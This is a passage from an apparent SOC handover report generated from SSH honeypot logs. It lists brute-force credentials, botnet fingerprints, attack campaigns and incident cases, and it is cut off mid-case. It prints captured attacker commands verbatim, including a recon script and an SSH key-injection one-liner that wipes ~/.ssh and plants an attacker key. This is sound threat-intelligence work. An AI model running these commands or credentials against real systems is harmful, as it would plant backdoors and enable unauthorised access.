# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-21 |
| **Generated At** | 2026-07-21T10:29:43Z |
| **Shift Time** | 10:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **310** |
| Confirmed Threats | **272** |
| False Positives Filtered | **38** (12.3%) |
| Unique Attacker IPs | **171** |
| Countries of Origin | **41** |
| High Severity Cases | **174** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **136** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **232** |
| Unique Credential Pairs | **112** |
| Unique Usernames | **36** |
| Unique Passwords | **81** |
| Successful Auth Pairs | **195** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `default` | 24 |
| `developer` | 15 |
| `test` | 13 |
| `admin` | 13 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 9 |
| `support` | 8 |
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `111111` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 8 |
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `LeitboGi0ro` | 6 |
| `admin` | `` | 6 |
| `config` | `config2023` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `administrator` | `root` | `92.118.39.14` | 2026-07-21T04:55:12 |
| `apache` | `1234` | `92.118.39.14` | 2026-07-21T04:57:12 |
| `steve` | `steve@123` | `45.159.113.178` | 2026-07-21T04:58:48 |
| `345gs5662d34` | `345gs5662d34` | `45.159.113.178` | 2026-07-21T04:58:52 |
| `steve` | `3245gs5662d34` | `45.159.113.178` | 2026-07-21T04:58:53 |
| `apache` | `12345678` | `92.118.39.14` | 2026-07-21T04:59:11 |
| `default` | `33333` | `187.49.63.51` | 2026-07-21T05:00:14 |
| `apache` | `Apache123` | `92.118.39.14` | 2026-07-21T05:01:08 |
| `apache` | `admin` | `92.118.39.14` | 2026-07-21T05:03:05 |
| `default` | `33333` | `112.28.73.142` | 2026-07-21T05:03:28 |
| `default` | `33333` | `119.160.166.237` | 2026-07-21T05:03:38 |
| `default` | `33333` | `10.0.0.73` | 2026-07-21T05:03:50 |
| `apache` | `apache` | `92.118.39.14` | 2026-07-21T05:05:03 |
| `apache` | `apache@123` | `92.118.39.14` | 2026-07-21T05:06:58 |
| `map` | `map123` | `112.217.188.122` | 2026-07-21T05:07:06 |
| `345gs5662d34` | `345gs5662d34` | `112.217.188.122` | 2026-07-21T05:07:09 |
| `map` | `3245gs5662d34` | `112.217.188.122` | 2026-07-21T05:07:10 |
| `apache` | `password` | `92.118.39.14` | 2026-07-21T05:08:54 |
| `test` | `test123456` | `138.118.213.68` | 2026-07-21T05:09:38 |
| `backup` | `123` | `92.118.39.14` | 2026-07-21T05:10:53 |
| `pi` | `default` | `185.2.228.48` | 2026-07-21T05:11:32 |
| `pi` | `default` | `122.176.45.238` | 2026-07-21T05:11:45 |
| `backup` | `12345678` | `92.118.39.14` | 2026-07-21T05:12:49 |
| `test` | `test123456` | `65.20.163.103` | 2026-07-21T05:13:01 |
| `test` | `test123456` | `213.130.207.177` | 2026-07-21T05:13:08 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-21T05:13:12 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-21T05:13:12 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-21T05:13:20 |
| `test` | `test123456` | `10.0.0.73` | 2026-07-21T05:13:25 |
| `hyh` | `123456` | `185.100.84.174` | 2026-07-21T05:14:01 |
| `backup` | `backup` | `92.118.39.14` | 2026-07-21T05:14:46 |
| `pi` | `default` | `202.72.196.75` | 2026-07-21T05:14:59 |
| `pi` | `default` | `92.126.223.175` | 2026-07-21T05:15:11 |
| `pi` | `default` | `10.0.0.73` | 2026-07-21T05:15:27 |
| `backup` | `backup123` | `92.118.39.14` | 2026-07-21T05:16:43 |
| `root` | `godzilla` | `10.0.0.73` | 2026-07-21T05:17:18 |
| `backup` | `password` | `92.118.39.14` | 2026-07-21T05:18:37 |
| `root` | `godzilla` | `185.242.3.195` | 2026-07-21T05:18:40 |
| `developer` | `1` | `92.118.39.14` | 2026-07-21T05:20:31 |
| `admin` | `admin` | `77.83.39.213` | 2026-07-21T05:21:59 |
| `developer` | `123` | `92.118.39.14` | 2026-07-21T05:22:25 |
| `developer` | `1234` | `92.118.39.14` | 2026-07-21T05:24:21 |
| `root` | `qweASD!@#` | `185.242.3.195` | 2026-07-21T05:26:01 |
| `developer` | `12345` | `92.118.39.14` | 2026-07-21T05:26:19 |
| `developer` | `123456` | `92.118.39.14` | 2026-07-21T05:28:15 |
| `operator` | `operator666` | `10.0.0.73` | 2026-07-21T05:28:39 |
| `developer` | `1234567` | `92.118.39.14` | 2026-07-21T05:30:12 |
| `developer` | `12345678` | `92.118.39.14` | 2026-07-21T05:32:07 |
| `test` | `test123456789` | `122.176.45.238` | 2026-07-21T05:33:04 |
| `test` | `test123456789` | `81.195.152.14` | 2026-07-21T05:33:11 |
| `developer` | `123456789` | `92.118.39.14` | 2026-07-21T05:33:59 |
| `support` | `support` | `176.53.159.196` | 2026-07-21T05:34:03 |
| `support` | `support` | `10.0.0.73` | 2026-07-21T05:35:23 |
| `developer` | `1234567890` | `92.118.39.14` | 2026-07-21T05:35:51 |
| `test` | `test123456789` | `10.0.0.73` | 2026-07-21T05:36:40 |
| `developer` | `abc123` | `92.118.39.14` | 2026-07-21T05:37:43 |
| `developer` | `admin` | `92.118.39.14` | 2026-07-21T05:39:36 |
| `pi` | `password123` | `10.0.0.73` | 2026-07-21T05:40:03 |
| `developer` | `dev` | `92.118.39.14` | 2026-07-21T05:41:31 |
| `developer` | `developer` | `92.118.39.14` | 2026-07-21T05:43:28 |
| `developer` | `password` | `92.118.39.14` | 2026-07-21T05:45:26 |
| `developer` | `qwerty` | `92.118.39.14` | 2026-07-21T05:47:25 |
| `docker` | `123` | `92.118.39.14` | 2026-07-21T05:49:20 |
| `root` | `admin` | `65.49.139.223` | 2026-07-21T05:50:19 |
| `docker` | `123456` | `92.118.39.14` | 2026-07-21T05:51:12 |
| `docker` | `12345678` | `92.118.39.14` | 2026-07-21T05:53:05 |
| `ubuntu` | `123123` | `10.0.0.73` | 2026-07-21T05:53:13 |
| `docker` | `123456789` | `92.118.39.14` | 2026-07-21T05:55:01 |
| `default` | `default2014` | `93.177.157.179` | 2026-07-21T05:56:26 |
| `default` | `default2014` | `185.2.228.48` | 2026-07-21T05:56:38 |
| `docker` | `docker` | `92.118.39.14` | 2026-07-21T05:56:58 |
| `docker` | `root` | `92.118.39.14` | 2026-07-21T05:58:56 |
| `default` | `default2014` | `10.0.0.73` | 2026-07-21T05:59:54 |
| `ec2-user` | `123456` | `92.118.39.14` | 2026-07-21T06:00:57 |
| `blank` | `4444` | `62.201.228.210` | 2026-07-21T06:01:04 |
| `ec2-user` | `12345678` | `92.118.39.14` | 2026-07-21T06:03:03 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-21T06:03:21 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-21T06:03:22 |
| `blank` | `4444` | `188.43.204.45` | 2026-07-21T06:04:26 |
| `blank` | `4444` | `61.185.30.170` | 2026-07-21T06:04:35 |
| `ec2-user` | `password` | `92.118.39.14` | 2026-07-21T06:04:59 |
| `ftp` | `123` | `92.118.39.14` | 2026-07-21T06:07:00 |
| `supervisor` | `supervisor2016` | `197.242.170.10` | 2026-07-21T06:08:04 |
| `supervisor` | `supervisor2016` | `10.0.0.73` | 2026-07-21T06:08:26 |
| `ftp` | `123456` | `92.118.39.14` | 2026-07-21T06:09:00 |
| `root` | `qweASD!@#` | `10.0.0.73` | 2026-07-21T06:09:22 |
| `ftp` | `admin` | `92.118.39.14` | 2026-07-21T06:10:54 |
| `ftp` | `anonymous` | `92.118.39.14` | 2026-07-21T06:12:48 |
| `ftp` | `ftp` | `92.118.39.14` | 2026-07-21T06:14:44 |
| `ftp` | `ftpuser` | `92.118.39.14` | 2026-07-21T06:16:40 |
| `test` | `88` | `116.113.241.82` | 2026-07-21T06:17:36 |
| `test` | `88` | `74.208.177.56` | 2026-07-21T06:17:43 |
| `ubuntu` | `asdf1` | `185.242.3.195` | 2026-07-21T06:18:04 |
| `git` | `123` | `92.118.39.14` | 2026-07-21T06:18:39 |
| `support` | `support2011` | `182.73.164.228` | 2026-07-21T06:19:41 |
| `support` | `support2011` | `187.218.57.50` | 2026-07-21T06:19:53 |
| `support` | `support2011` | `106.0.166.123` | 2026-07-21T06:23:14 |
| `support` | `support2011` | `138.219.13.21` | 2026-07-21T06:23:16 |
| `support` | `support2011` | `10.0.0.73` | 2026-07-21T06:23:20 |
| `atul` | `atul@123` | `159.198.40.128` | 2026-07-21T06:26:43 |
| `345gs5662d34` | `345gs5662d34` | `159.198.40.128` | 2026-07-21T06:26:45 |
| `atul` | `3245gs5662d34` | `159.198.40.128` | 2026-07-21T06:26:45 |
| `yuri` | `yuri123` | `192.210.192.220` | 2026-07-21T06:27:45 |
| `345gs5662d34` | `345gs5662d34` | `192.210.192.220` | 2026-07-21T06:27:46 |
| `yuri` | `3245gs5662d34` | `192.210.192.220` | 2026-07-21T06:27:46 |
| `blank` | `blank444` | `222.222.124.164` | 2026-07-21T06:29:02 |
| `blank` | `blank444` | `223.107.72.234` | 2026-07-21T06:29:13 |
| `blank` | `blank444` | `10.0.0.73` | 2026-07-21T06:29:25 |
| `debian` | `5` | `124.152.90.68` | 2026-07-21T06:32:30 |
| `debian` | `5` | `113.200.216.246` | 2026-07-21T06:32:39 |
| `admin` | `7777777` | `92.62.74.41` | 2026-07-21T06:42:05 |
| `admin` | `7777777` | `10.0.0.73` | 2026-07-21T06:42:30 |
| `config` | `123abc` | `14.23.77.27` | 2026-07-21T06:46:20 |
| `config` | `123abc` | `154.160.69.206` | 2026-07-21T06:46:28 |
| `config` | `123abc` | `10.0.0.73` | 2026-07-21T06:46:41 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-21T06:48:06 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-21T06:48:06 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-21T06:48:16 |
| `user` | `2` | `117.250.19.91` | 2026-07-21T06:50:29 |
| `user` | `2` | `177.174.105.113` | 2026-07-21T06:53:58 |
| `default` | `111111` | `180.188.253.150` | 2026-07-21T06:54:02 |
| `default` | `111111` | `222.139.245.137` | 2026-07-21T06:54:15 |
| `default` | `111111` | `211.253.10.61` | 2026-07-21T06:57:24 |
| `default` | `111111` | `10.0.0.73` | 2026-07-21T06:57:48 |
| `usr` | `www.usr.cn` | `217.60.195.143` | 2026-07-21T07:00:29 |
| `ubuntu` | `asdf1` | `10.0.0.73` | 2026-07-21T07:00:54 |
| `admin` | `admin` | `34.76.235.60` | 2026-07-21T07:04:29 |
| `nobody` | `nobody2015` | `202.72.196.75` | 2026-07-21T07:06:44 |
| `nobody` | `nobody2015` | `31.41.81.65` | 2026-07-21T07:06:52 |
| `ubuntu` | `123abc` | `34.41.211.48` | 2026-07-21T07:07:03 |
| `ubuntu` | `123abc` | `10.0.0.73` | 2026-07-21T07:07:33 |
| `root` | `qwert@12#$` | `185.242.3.195` | 2026-07-21T07:09:36 |
| `nobody` | `nobody2015` | `196.188.93.169` | 2026-07-21T07:09:45 |
| `nobody` | `nobody2015` | `10.0.0.73` | 2026-07-21T07:10:09 |
| `harsh` | `harsh` | `201.51.3.244` | 2026-07-21T07:14:14 |
| `345gs5662d34` | `345gs5662d34` | `201.51.3.244` | 2026-07-21T07:14:17 |
| `harsh` | `3245gs5662d34` | `201.51.3.244` | 2026-07-21T07:14:17 |
| `unknown` | `111111` | `178.178.194.123` | 2026-07-21T07:18:47 |
| `unknown` | `111111` | `14.29.204.161` | 2026-07-21T07:19:00 |
| `centos` | `7` | `10.0.0.73` | 2026-07-21T07:22:30 |
| `config` | `config2023` | `196.188.93.169` | 2026-07-21T07:30:00 |
| `config` | `config2023` | `65.20.134.97` | 2026-07-21T07:30:12 |
| `debian` | `111` | `218.58.73.238` | 2026-07-21T07:31:43 |
| `debian` | `111` | `10.0.0.73` | 2026-07-21T07:32:02 |
| `config` | `config2023` | `223.99.212.58` | 2026-07-21T07:33:23 |
| `config` | `config2023` | `182.75.197.174` | 2026-07-21T07:33:38 |
| `config` | `config2023` | `10.0.0.73` | 2026-07-21T07:33:39 |
| `user` | `77777` | `218.206.136.24` | 2026-07-21T07:40:04 |
| `user` | `77777` | `196.188.93.169` | 2026-07-21T07:40:16 |
| `default` | `default55` | `185.112.148.66` | 2026-07-21T07:43:28 |
| `root` | `123@@@` | `146.56.164.20` | 2026-07-21T07:43:31 |
| `root` | `LeitboGi0ro` | `146.56.164.20` | 2026-07-21T07:43:31 |
| `default` | `default55` | `14.97.77.182` | 2026-07-21T07:43:35 |
| `user` | `77777` | `111.39.206.23` | 2026-07-21T07:43:40 |
| `user` | `77777` | `10.0.0.73` | 2026-07-21T07:43:59 |
| `default` | `default55` | `60.223.245.120` | 2026-07-21T07:46:57 |
| `default` | `default55` | `75.80.65.214` | 2026-07-21T07:47:05 |
| `default` | `default55` | `10.0.0.73` | 2026-07-21T07:47:14 |
| `root` | `qwert@12#$` | `10.0.0.73` | 2026-07-21T07:52:53 |
| `default` | `default2013` | `218.28.18.2` | 2026-07-21T07:53:26 |
| `default` | `default2013` | `77.106.78.215` | 2026-07-21T07:53:33 |
| `nobody` | `33` | `62.201.212.54` | 2026-07-21T07:56:21 |
| `nobody` | `33` | `10.0.0.73` | 2026-07-21T07:56:50 |
| `nicole` | `123@nicole` | `185.242.3.195` | 2026-07-21T08:01:32 |
| `postgres` | `p@ssw0rd` | `45.181.101.95` | 2026-07-21T08:04:54 |
| `postgres` | `p@ssw0rd` | `213.130.207.177` | 2026-07-21T08:05:01 |
| `root` | `Work@2025` | `159.223.93.39` | 2026-07-21T08:06:41 |
| `root` | `alex123` | `102.23.122.235` | 2026-07-21T08:06:44 |
| `345gs5662d34` | `345gs5662d34` | `159.223.93.39` | 2026-07-21T08:06:46 |
| `root` | `3245gs5662d34` | `159.223.93.39` | 2026-07-21T08:06:48 |
| `345gs5662d34` | `345gs5662d34` | `102.23.122.235` | 2026-07-21T08:06:49 |
| `root` | `3245gs5662d34` | `102.23.122.235` | 2026-07-21T08:06:51 |
| `postgres` | `p@ssw0rd` | `111.70.9.143` | 2026-07-21T08:08:10 |
| `postgres` | `p@ssw0rd` | `10.0.0.73` | 2026-07-21T08:08:37 |
| `default` | `000000` | `10.0.0.73` | 2026-07-21T08:11:55 |
| `root` | `admin` | `220.116.26.179` | 2026-07-21T08:13:32 |
| `supervisor` | `supervisor2025` | `183.196.144.45` | 2026-07-21T08:20:15 |
| `test` | `test888` | `164.164.117.23` | 2026-07-21T08:21:03 |
| `test` | `test888` | `117.247.239.202` | 2026-07-21T08:21:13 |
| `mysql` | `Passw@rd` | `207.254.22.207` | 2026-07-21T08:29:32 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `66.228.53.204` | 2026-07-21T08:29:51 |
| `admin` | `admin` | `47.77.182.54` | 2026-07-21T08:29:54 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-21T08:29:54 |
| `mysql` | `Passw@rd` | `125.139.124.120` | 2026-07-21T08:33:02 |
| `mysql` | `Passw@rd` | `189.56.0.19` | 2026-07-21T08:33:13 |
| `ubuntu` | `password123` | `185.81.94.58` | 2026-07-21T08:36:24 |
| `ubuntu` | `password123` | `200.89.159.59` | 2026-07-21T08:36:32 |
| `ubuntu` | `password123` | `10.0.0.73` | 2026-07-21T08:36:58 |
| `nobody` | `nobody2014` | `10.0.0.73` | 2026-07-21T08:44:04 |
| `nicole` | `123@nicole` | `10.0.0.73` | 2026-07-21T08:44:39 |
| `default` | `4` | `49.124.153.27` | 2026-07-21T08:46:01 |
| `default` | `4` | `10.0.0.73` | 2026-07-21T08:46:11 |
| `ubuntu` | `zaq1@WSX` | `185.242.3.195` | 2026-07-21T08:53:25 |
| `user` | `333333` | `210.0.90.82` | 2026-07-21T08:54:21 |
| `user` | `333333` | `192.34.128.202` | 2026-07-21T08:54:29 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **310** |
| Sessions with Fingerprint | **21** |
| Unique HASSH Fingerprints | **21** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 75 |
| Go SSH scanner | 65 |
| libssh | 47 |
| Paramiko (Python) | 14 |
| Nmap scanner | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 74 | 68 |
| `2ec37a7cc8da...` | Mirai/variant | 44 | 1 |
| `f555226df196...` | Mirai/variant | 21 | 7 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `16443846184e...` | Generic scanner | 10 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 74 | 68 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 44 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 23 | 12 | — |
| `f555226df196...` | libssh | 21 | 7 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 10 | 2 | Generic scanner |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 44 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 7 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `217.60.195.143`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `159.223.93.39`, `159.198.40.128`, `192.210.192.220`, `201.51.3.244`, `45.159.113.178`, `112.217.188.122`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **171** |
| Unique ASNs | **105** |
| High-Risk ASNs | **92** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 11 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 8 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 7 | HIGH |
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (174)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-dc48ad318e20

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:55 |
| **Last Seen** | 2026-07-21 04:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:55:10` | `cowrie.session.connect` |
| `2026-07-21 04:55:11` | `cowrie.client.version` |
| `2026-07-21 04:55:11` | `cowrie.client.kex` |
| `2026-07-21 04:55:12` | `cowrie.login.success` |
| `2026-07-21 04:55:14` | `cowrie.session.params` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.success` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.command.input` |
| `2026-07-21 04:55:14` | `cowrie.log.closed` |
| `2026-07-21 04:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83bc3ddfeca0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:57 |
| **Last Seen** | 2026-07-21 04:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:57:08` | `cowrie.session.connect` |
| `2026-07-21 04:57:08` | `cowrie.client.version` |
| `2026-07-21 04:57:08` | `cowrie.client.kex` |
| `2026-07-21 04:57:12` | `cowrie.login.success` |
| `2026-07-21 04:57:13` | `cowrie.session.params` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.success` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:13` | `cowrie.command.input` |
| `2026-07-21 04:57:14` | `cowrie.log.closed` |
| `2026-07-21 04:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-150eac03defb

| Field | Detail |
|---|---|
| **Source IP** | `45.159.113[.]178` |
| **First Seen** | 2026-07-21 04:58 |
| **Last Seen** | 2026-07-21 04:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:58:47` | `cowrie.session.connect` |
| `2026-07-21 04:58:47` | `cowrie.client.version` |
| `2026-07-21 04:58:47` | `cowrie.client.kex` |
| `2026-07-21 04:58:48` | `cowrie.login.success` |
| `2026-07-21 04:58:49` | `cowrie.session.params` |
| `2026-07-21 04:58:49` | `cowrie.command.input` |
| `2026-07-21 04:58:49` | `cowrie.command.failed` |
| `2026-07-21 04:58:49` | `cowrie.log.closed` |
| `2026-07-21 04:58:50` | `cowrie.session.params` |
| `2026-07-21 04:58:50` | `cowrie.command.input` |
| `2026-07-21 04:58:52` | `cowrie.session.file_download` |
| `2026-07-21 04:58:52` | `cowrie.log.closed` |
| `2026-07-21 04:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.159.113[.]178` to AbuseIPDB if not already reported
- [ ] Block `45.159.113[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60daeb31cb59

| Field | Detail |
|---|---|
| **Source IP** | `45.159.113[.]178` |
| **First Seen** | 2026-07-21 04:58 |
| **Last Seen** | 2026-07-21 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
